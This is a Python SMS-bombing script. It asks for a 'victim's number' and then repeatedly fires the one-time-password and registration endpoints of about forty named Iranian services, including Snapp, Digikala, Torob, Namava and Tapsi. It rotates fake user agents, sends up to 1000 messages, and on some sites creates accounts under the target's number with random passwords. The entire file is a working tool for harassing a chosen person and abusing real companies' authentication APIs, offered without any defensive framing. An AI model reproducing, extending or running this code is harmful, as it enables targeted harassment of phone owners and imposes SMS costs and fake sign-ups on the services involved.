import requests
from time import sleep
import random
import string
from fake_useragent import UserAgent
from json import loads


def basalam(head):
    try:
        url = 'https://auth.basalam.com/otp-request'
        payload = {'mobile': '0' + number}
        result = requests.post(url, data=payload, json=head, timeout=5)

        # print(f'Basalam: {result.status_code}')

        if result.status_code != 200:
            sleep(60)
            return False
        
        return True

    except Exception as e:
        print(f"[basalam] - {e}")


def snapp(head):
    try:
        url = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'
        payload = {'cellphone': '+98' + number}
        result = requests.post(url, data=payload, json=head, timeout=5)

        # print(f'Snapp: {result.status_code}')

        if result.status_code != 200:
            sleep(60)
            return False
        
        return True

    except Exception as e:
        print(f"[snapp] - {e}")


def lendo(head):
    try:
        url = 'https://api.lendo.ir/api/customer/auth/send-otp'
        payload = {'mobile': '0' + number}
        result = requests.post(url, data=payload, json=head, timeout=5)

        # print(f'Lendo: {result.status_code}')

        if result.status_code != 200:
            sleep(60)
            return False
        
        return True

    except Exception as e:
        print(f"[lendo] - {e}")


def baskool(head):
    try:
        url = 'https://www.buskool.com/send_verification_code'
        payload = {'phone': '0' + number}
        result = requests.post(url, data=payload, json=head, timeout=5)

        # print(f'baskool: {result.status_code}')

        if result.status_code != 200:
            sleep(60)
            return False
        
        return True

    except Exception as e:
        print(f"[baskool] - {e}")


def torob(head):
    try:
        url = 'https://api.torob.com/v4/user/phone/send-pin'
        params = {'phone_number': '0' + number}
        result = requests.get(url, params=params, json=head, timeout=5)

        # print(f'torob: {result.status_code}')

        if result.status_code != 200:
            sleep(60)
            return False
        
        return True

    except Exception as e:
        print(f"[torob] - {e}")


def drdr(head):
    try:
        url = 'https://drdr.ir/api/registerEnrollment/verifyMobile'
        payload = {
            'phoneNumber': number,
            'userType': 'PATIENT'
        }
        result = requests.post(url, data=payload, json=head, timeout=5)

        # print(f'drdr: {result.status_code}')

        if result.status_code != 200:
            sleep(60)
            return False
        
        return True

    except Exception as e:
        print(f"[drdr] - {e}")


def itol(head):
    try:
        url = 'https://app.itoll.ir/api/v1/auth/login'
        payload = {'mobile': '0' + number}
        result = requests.post(url, data=payload, json=head, timeout=5)

        # print(f'itol: {result.status_code}')

        if result.status_code != 200:
            sleep(60)
            return False
        
        return True

    except Exception as e:
        print(f"[itol] - {e}")

def telewebion(head):
    try:
        url = 'https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one'
        payload = {
            'code': '98',
            'phone': number,
            'smsStatus': 'default'
        }
        result = requests.post(url, data=payload, json=head, timeout=5)

        # print(f'telewebion: {result.status_code}')

        if result.status_code != 200:
            sleep(60)
            return False
        
        return True

    except Exception as e:
        print(f"[telewebion] - {e}")


def arasTag(head):
    try:
        url = 'https://arastag.ir/wp-admin/admin-ajax.php'
        payload = {
            'action': 'verify_user_login',
            'user': '0' + number,
            'captcha': ''
        }
        result = requests.post(url, data=payload, json=head, timeout=5)

        # print(f'arasTag: {result.status_code}')

        if result.status_code != 200:
            sleep(60)
            return False
        
        return True

    except Exception as e:
        print(f"[arasTag] - {e}")


def zagros(head):
    try:
        url = 'https://www.zzzagros.com/wp-admin/admin-ajax.php'
        payload = {
            'action': 'ywp_ajax_register',
            'ywp_register': '1',
            'ywp_reg_mobile': '0' + number,
            'ywp_reg_password': randomPassword,
            'ajax_woocommerce_register_nonce': ''
        }
        result = requests.post(url, data=payload, json=head, timeout=5)

        # print(f'zagros: {result.status_code}')

        if result.status_code != 200:
            sleep(60)
            return False
        
        return True

    except Exception as e:
        print(f"[zagros] - {e}")


def novinMedical(head):
    try:
        url = 'https://novinmedical.com/wp-admin/admin-ajax.php'
        payload = {
            'action': 'stm_login_register',
            'type': 'mobile',
            'input': '0' + number
        }
        result = requests.post(url, data=payload, json=head, timeout=5)

        # print(f'novinMedical: {result.status_code}')

        if result.status_code != 200:
            sleep(60)
            return False
        
        return True

    except Exception as e:
        print(f"[novinMedical] - {e}")


def harikaShop(head):
    try:
        url = 'https://harikashop.com/login?back=my-account'
        payload = {
            'username': '0' + number,
            'id_customer': '',
            'back': [
                '',
                'https://harikashop.com/login?back=my-account'
            ],
            'firstname': persianString,
            'lastname': persianString,
            'password': randomPassword,
            'action': 'register',
            'ajax': '1'
        }
        result = requests.post(url, data=payload, json=head, timeout=5)

        # print(f'harikaShop: {result.status_code}')

        if result.status_code != 200:
            sleep(60)
            return False
        
        return True

    except Exception as e:
        print(f"[harikaShop] - {e}")


def hamrahSport(head):
    try:
        url = 'https://hamrahsport.com/send-otp'
        payload = {
            'cell': number,
            'name': 'persianString',
            'agree': '1',
            'send_otp': '1',
            'otp': ''
        }
        result = requests.post(url, data=payload, json=head, timeout=5)

        # print(f'hamrahSport: {result.status_code}')

        if result.status_code != 200:
            sleep(60)
            return False
        
        return True

    except Exception as e:
        print(f"[hamrahSport] - {e}")


def carOpex(head):
    try:
        url = 'https://caropex.com/api/v1/user/login'
        payload = {'mobile': '0' + number}
        result = requests.post(url, data=payload, json=head, timeout=5)

        # print(f'carOpex: {result.status_code}')

        if result.status_code != 200:
            sleep(60)
            return False
        
        return True

    except Exception as e:
        print(f"[carOpex] - {e}")


def tamimPishro(head):
    try:
        url = 'https://www.tamimpishro.com/site/api/v1/user/otp'
        payload = {'mobile': '0' + number}
        result = requests.post(url, data=payload, json=head, timeout=5)

        # print(f'tamimPishro: {result.status_code}')

        if result.status_code != 200:
            sleep(60)
            return False
        
        return True

    except Exception as e:
        print(f"[tamimPishro] - {e}")


def gap(head):
    try:
        url = 'https://core.gap.im/v1/user/add.json'
        params = {'mobile': '+98' + number}
        result = requests.get(url, params=params, json=head, timeout=5)

        # print(f'gap: {result.status_code}')

        if result.status_code != 200:
            sleep(60)
            return False
        
        return True

    except Exception as e:
        print(f"[gap] - {e}")


def shahreFafa(head):
    try:
        url = 'https://api2.fafait.net/oauth/check-user'
        payload = {'id': '0' + number}
        result = requests.post(url, data=payload, json=head, timeout=5)

        # print(f'shahreFafa: {result.status_code}')

        if result.status_code != 200:
            sleep(60)
            return False
        
        return True

    except Exception as e:
        print(f"[shahreFafa] - {e}")


def fanKala(head):
    try:
        url = 'https://fankala.com/wp-admin/admin-ajax.php'
        payload = {
            'action': 'verify_user_login',
            'user': '0' + number,
            'captcha': ''
        }
        result = requests.post(url, data=payload, json=head, timeout=5)

        # print(f'fanKala: {result.status_code}')

        if result.status_code != 200:
            sleep(60)
            return False
        
        return True

    except Exception as e:
        print(f"[fanKala] - {e}")


def khanoumi(head):
    try:
        url = 'https://www.khanoumi.com/accounts/sendotp'
        payload = {
            'mobile': '0' + number,
            'redirectUrl': ''
        }
        result = requests.post(url, data=payload, json=head, timeout=5)

        # print(f'khanoumi: {result.status_code}')

        if result.status_code != 200:
            sleep(60)
            return False
        
        return True

    except Exception as e:
        print(f"[khamoumi] - {e}")


def digiStyle(head):
    try:
        url = 'https://www.digistyle.com/users/login-register/'
        payload = {'loginRegister[email_phone]': '0' + number}
        result = requests.post(url, data=payload, json=head, timeout=5)

        # print(f'digiStyle: {result.status_code}')

        if result.status_code != 200:
            sleep(60)
            return False
        
        return True

    except Exception as e:
        print(f"[digiStyle] - {e}")


def baniMode(head):
    try:
        url = 'https://mobapi.banimode.com/api/v2/auth/request'
        payload = {'phone': '0' + number}
        result = requests.post(url, data=payload, json=head, timeout=5)

        # print(f'baniMode: {result.status_code}')

        if result.status_code != 200:
            sleep(60)
            return False
        
        return True

    except Exception as e:
        print(f"[baniMode] - {e}")


def timcheh(head):
    try:
        url = 'https://api.timcheh.com/auth/otp/send'
        payload = {'mobile': '0' + number}
        result = requests.post(url, data=payload, json=head, timeout=5)

        # print(f'timcheh: {result.status_code}')

        if result.status_code != 200:
            sleep(60)
            return False
        
        return True

    except Exception as e:
        print(f"[timcheh] - {e}")


def achareh(head):
    try:
        url = 'https://api.achareh.co/v2/accounts/login/'
        payload = {'phone': '98' + number}
        result = requests.post(url, data=payload, json=head, timeout=5)

        # print(f'achareh: {result.status_code}')

        if result.status_code != 200:
            sleep(60)
            return False
        
        return True

    except Exception as e:
        print(f"[achareh] - {e}")


def mrBilit(head):
    try:
        url = 'https://auth.mrbilit.com/api/login/exists/v2'
        params = {
            'mobileOrEmail': '0' + number,
            'source': '2',
            'sendTokenIfNot': 'true'
        }
        result = requests.get(url, params=params, json=head, timeout=5)

        # print(f'mrBilit: {result.status_code}')

        if result.status_code != 200:
            sleep(60)
            return False
        
        return True

    except Exception as e:
        print(f"[mrBilit] - {e}")


def rojaShop(head):
    try:
        url = 'https://rojashop.com/api/loginRegister'
        payload = {
            'mobile': number,
            'withOtp': '1'
        }
        result = requests.post(url, data=payload, json=head, timeout=5)

        # print(f'rojaShop: {result.status_code}')

        if result.status_code != 200:
            sleep(60)
            return False
        
        return True

    except Exception as e:
        print(f"[rojaShop] - {e}")


def safirStores(head):
    try:
        url = 'https://www.safirstores.com/index.php?route=account%2Flogin%2FgetRandCode'
        payload = {'telephone': '0' + number}
        result = requests.post(url, data=payload, json=head, timeout=5)

        # print(f'safirStores: {result.status_code}')

        if result.status_code != 200:
            sleep(60)
            return False
        
        return True

    except Exception as e:
        print(f"[safirStores] - {e}")


def digikala(head):
    try:
        url = 'https://api.digikala.com/v1/user/authenticate/'
        payload = {
            'backUrl': '/',
            'username': '0' + number,
            'otp_call': 'false'
        }
        result = requests.post(url, json=payload, headers=head, timeout=5)

        # print(f'digikala: {result.status_code}')

        if result.status_code != 200:
            sleep(60)
            return False
        
        return True

    except Exception as e:
        print(f"[digikala] - {e}")


def mobit(head):
    try:
        url = 'https://api.mobit.ir/api/web/v8/register/register'
        payload = {'number': '0' + number}
        result = requests.post(url, json=payload, headers=head, timeout=5)

        # print(f'mobit: {result.status_code}')

        if result.status_code != 200:
            sleep(60)
            return False
        
        return True

    except Exception as e:
        print(f"[mobit] - {e}")


def okala(head):
    try:
        url = 'https://api-react.okala.com/C/CustomerAccount/OTPRegister'
        payload = {
            'mobile': '0' + number,
            'deviceTypeCode': 0,
            'confirmTerms': 'true',
            'notRobot': 'false',
        }
        result = requests.post(url, json=payload, headers=head, timeout=5)

        # print(f'okala: {result.status_code}')

        if result.status_code != 200:
            sleep(60)
            return False
        
        return True

    except Exception as e:
        print(f"[okala] - {e}")


def doctoreTo(head):
    try:
        url = 'https://api.doctoreto.com/api/web/patient/v1/accounts/register'
        payload = {
            'country_id': 205,
            'mobile': number
        }
        result = requests.post(url, json=payload, headers=head, timeout=5)

        # print(f'doctoreTo: {result.status_code}')

        if result.status_code != 200:
            sleep(60)
            return False
        
        return True

    except Exception as e:
        print(f"[doctoreTo] - {e}")


def snappDoctor(head):
    try:
        url = f'https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/0{number}/sms'
        params = {'cCode': '+98'}
        result = requests.get(url, params=params, json=head, timeout=5)

        # print(f'snappDoctor: {result.status_code}')

        if result.status_code != 200:
            sleep(60)
            return False
        
        return True

    except Exception as e:
        print(f"[snappDoctor] - {e}")


def snappApps(head):
    try:
        url = 'https://api.snapp.ir/api/v1/sms/link'
        payload = {'phone': '0' + number}
        result = requests.post(url, json=payload, headers=head, timeout=5)

        # print(f'snappApps: {result.status_code}')

        if result.status_code != 200:
            sleep(60)
            return False
        
        return True

    except Exception as e:
        print(f"[snappApps] - {e}")


def namava(head):
    try:
        url = 'https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request'
        payload = {'UserName': '+98' + number}
        result = requests.post(url, json=payload, headers=head, timeout=5)

        # print(f'namava: {result.status_code}')

        if result.status_code != 200:
            sleep(60)
            return False
        
        return True

    except Exception as e:
        print(f"[namava] - {e}")


def filmNet(head):
    try:
        url = f'https://filmnet.ir/api-v2/access-token/users/0{number}/otp'
        result = requests.get(url, json=head, timeout=5)

        # print(f'filmNet: {result.status_code}')

        if result.status_code != 200:
            sleep(60)
            return False
        
        return True

    except Exception as e:
        print(f"[filmNet] - {e}")


def dalfak(head):
    try:
        url = 'https://www.dalfak.com/api/auth/sendVerificationCode'
        payload = {
            'type': 1,
            'value': '0' + number
        }
        result = requests.post(url, json=payload, headers=head, timeout=5)

        # print(f'dalfak: {result.status_code}')

        if result.status_code != 200:
            sleep(60)
            return False
        
        return True

    except Exception as e:
        print(f"[dalfak] - {e}")


def digiCall(head):
    try:
        url = 'https://api.digikala.com/v1/user/authenticate/'
        payload = {
            'backUrl': '/',
            'username': '0' + number,
            'otp_call': 'true'
        }
        result = requests.post(url, json=payload, headers=head, timeout=5)

        # print(f'digiCall: {result.status_code}')

        if result.status_code != 200:
            sleep(60)
            return False
        
        return True

    except Exception as e:
        print(f"[digiCall] - {e}")


def taaghche(head):
    try:
        payload = {
            "contact": f"0{number}",
            "forceOtp": False
        }
        def login():
            url = "https://gw.taaghche.com/v4/site/auth/login"
            return requests.post(url, json=payload, headers=head)


        def register():
            url = "https://gw.taaghche.com/v4/site/auth/signup"
            return requests.post(url, json=payload, headers=head)

        result = login()
        # print(f'taaghche: {result.status_code}')

        if result.status_code != 200:
            sleep(60)
            return False

        res = loads(result.content.decode())

        if "loginWithPassword" in res.keys():
            if res['loginWithPassword'] is True:
                return False

        result = register()

        if result.status_code != 200:
            sleep(60)
            return False

        return True

    except Exception as e:
        print(f"[taagche] - {e}")


def bazar(head):
    try:
        url = "https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest"
        payload = {
                "properties":
                    {"language": 2,
                     "clientID": "zlximlwk7blsdneoq5de8w4ae21l5yu7",
                     "deviceID": "zlximlwk7blsdneoq5de8w4ae21l5yu7",
                     "clientVersion": "web"
                     },
                   "singleRequest":
                       {"getOtpTokenRequest":
                            {"username": f"98{number}"}
                        }
                   }

        result = requests.post(url, headers=head, json=payload)

        if result.status_code != 200:
            return False

        return True

    except Exception as e:
        print(f"[bazar] - {e}")


def tapsi(head):
    try:
        url = "https://api.tapsi.cab/api/v2.2/user"
        payload = {
            "credential": {
                "phoneNumber": f"0{number}",
                "role": "PASSENGER"
            },
            "otpOption":"SMS"
        }

        result = requests.post(url, json=payload, headers=head)

        # print(result.status_code, result.content.decode())

        if result.status_code != 200:
            return False

        return True

    except Exception as e:
        print(f"[tapsi] - {e}")


def alibaba(head):
    try:
        url = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
        payload = {"phoneNumber" : f"9{number}" }

        result = requests.post(url, json=payload, headers=head)

        print(result.status_code, result.content.decode())

        if result.status_code != 200:
            return False

        return True

    except Exception as e:
        print(f"[alibaba] - {e}")


def progressBar(finish: int, total: int):
    progress = finish / total
    percent_done = round(progress * 100, 2)
    downloaded_str = f'{finish}/{total}'
    progress_bar_length = 20
    completed = int(round(progress_bar_length * progress))
    remaining = progress_bar_length - completed
    progress_bar = '[' + '=' * completed + ' ' * remaining + ']'
    if finish == total:
        print(f'Progress: {progress_bar} {percent_done}% ({downloaded_str})', end='\n')
        return
    print(f'Progress: {progress_bar} {percent_done}% ({downloaded_str})', end='\r')


def sendMessage(userAgent, maxCount: int = 1000):
    counter = 0
    
    while True:
        head = {
            'User-Agent': userAgent.random,
            'Accept': '*/*'
        }

        if snapp(head) is True:
            counter += 1
            progressBar(counter, maxCount)
            if counter == maxCount:
                exit(0)

        if lendo(head) is True:
            counter += 1
            progressBar(counter, maxCount)
            if counter == maxCount:
                exit(0)


        if baskool(head) is True:
            counter += 1
            progressBar(counter, maxCount)
            if counter == maxCount:
                exit(0)


        if torob(head) is True:
            counter += 1
            progressBar(counter, maxCount)
            if counter == maxCount:
                exit(0)


        if drdr(head) is True:
            counter += 1
            progressBar(counter, maxCount)
            if counter == maxCount:
                exit(0)


        if itol(head) is True:
            counter += 1
            progressBar(counter, maxCount)
            if counter == maxCount:
                exit(0)


        if telewebion(head) is True:
            counter += 1
            progressBar(counter, maxCount)
            if counter == maxCount:
                exit(0)


        if arasTag(head) is True:
            counter += 1
            progressBar(counter, maxCount)
            if counter == maxCount:
                exit(0)


        if basalam(head) is True:
            counter += 1
            progressBar(counter, maxCount)
            if counter == maxCount:
                exit(0)


        if zagros(head) is True:
            counter += 1
            progressBar(counter, maxCount)
            if counter == maxCount:
                exit(0)


        if novinMedical(head) is True:
            counter += 1
            progressBar(counter, maxCount)
            if counter == maxCount:
                exit(0)


        if harikaShop(head) is True:
            counter += 1
            progressBar(counter, maxCount)
            if counter == maxCount:
                exit(0)


        if hamrahSport(head) is True:
            counter += 1
            progressBar(counter, maxCount)
            if counter == maxCount:
                exit(0)


        if carOpex(head) is True:
            counter += 1
            progressBar(counter, maxCount)
            if counter == maxCount:
                exit(0)


        if tamimPishro(head) is True:
            counter += 1
            progressBar(counter, maxCount)
            if counter == maxCount:
                exit(0)


        if gap(head) is True:
            counter += 1
            progressBar(counter, maxCount)
            if counter == maxCount:
                exit(0)


        if shahreFafa(head) is True:
            counter += 1
            progressBar(counter, maxCount)
            if counter == maxCount:
                exit(0)


        if fanKala(head) is True:
            counter += 1
            progressBar(counter, maxCount)
            if counter == maxCount:
                exit(0)


        if khanoumi(head) is True:
            counter += 1
            progressBar(counter, maxCount)
            if counter == maxCount:
                exit(0)


        if digiStyle(head) is True:
            counter += 1
            progressBar(counter, maxCount)
            if counter == maxCount:
                exit(0)


        if baniMode(head) is True:
            counter += 1
            progressBar(counter, maxCount)
            if counter == maxCount:
                exit(0)


        if timcheh(head) is True:
            counter += 1
            progressBar(counter, maxCount)
            if counter == maxCount:
                exit(0)


        if achareh(head) is True:
            counter += 1
            progressBar(counter, maxCount)
            if counter == maxCount:
                exit(0)


        if mrBilit(head) is True:
            counter += 1
            progressBar(counter, maxCount)
            if counter == maxCount:
                exit(0)


        if rojaShop(head) is True:
            counter += 1
            progressBar(counter, maxCount)
            if counter == maxCount:
                exit(0)


        if safirStores(head) is True:
            counter += 1
            progressBar(counter, maxCount)
            if counter == maxCount:
                exit(0)


        if digikala(head) is True:
            counter += 1
            progressBar(counter, maxCount)
            if counter == maxCount:
                exit(0)


        if mobit(head) is True:
            counter += 1
            progressBar(counter, maxCount)
            if counter == maxCount:
                exit(0)


        if okala(head) is True:
            counter += 1
            progressBar(counter, maxCount)
            if counter == maxCount:
                exit(0)


        if doctoreTo(head) is True:
            counter += 1
            progressBar(counter, maxCount)
            if counter == maxCount:
                exit(0)


        if snappDoctor(head) is True:
            counter += 1
            progressBar(counter, maxCount)
            if counter == maxCount:
                exit(0)


        if snappApps(head) is True:
            counter += 1
            progressBar(counter, maxCount)
            if counter == maxCount:
                exit(0)


        if namava(head) is True:
            counter += 1
            progressBar(counter, maxCount)
            if counter == maxCount:
                exit(0)


        if filmNet(head) is True:
            counter += 1
            progressBar(counter, maxCount)
            if counter == maxCount:
                exit(0)


        if dalfak(head) is True:
            counter += 1
            progressBar(counter, maxCount)
            if counter == maxCount:
                exit(0)


        if dalfak(head) is True:
            counter += 1
            progressBar(counter, maxCount)
            if counter == maxCount:
                exit(0)


        if digiCall(head) is True:
            counter += 1
            progressBar(counter, maxCount)
            if counter == maxCount:
                exit(0)


        if taaghche(head) is True:
            counter += 1
            progressBar(counter, maxCount)
            if counter == maxCount:
                exit(0)
    
        sleep(2)


def main():
    global number, randomPassword, persianString

    try:
        while True:
            number = input("Enter the victim's number(9xxxxxxxxx) ~> ")
            if not number.isdigit() or len(number) != 10 or number[0] != '9':
                print('Invalid input. Please enter a valid 10-digit phone number starting with \'9\'.')
                continue
            break

        userAgent = UserAgent()

        chars = string.ascii_letters + string.digits
        randomPassword = ''.join(random.choice(chars) for i in range(8))
        persianChars = ['ا', 'ب', 'پ', 'ت', 'ث', 'ج', 'چ', 'ح', 'خ', 'د', 'ذ', 'ر', 'ز', 'ژ', 'س', 'ش', 'ص', 'ض', 'ط', 'ظ',
                         'ع', 'غ', 'ف', 'ق', 'ک', 'گ', 'ل', 'م', 'ن', 'و', 'ه', 'ی']
        persianString = ''.join(random.choice(persianChars) for i in range(6))

        while True:
            counter = input("Count of message ~> ")
            if not counter.isdigit():
                print("Invalid input. Please enter number between 1000-0")
                continue
            counter = int(counter)

            if counter > 1000 or counter < 1:
                print("Invalid input. Please enter number between 1000-0")
                continue

            break

        try:
            sendMessage(userAgent, counter)
        except Exception as e:
            print(f"[Main] - {e}")
            exit(-1)
    except KeyboardInterrupt:
        print("Good Bye")


if __name__ == "__main__":
    main()
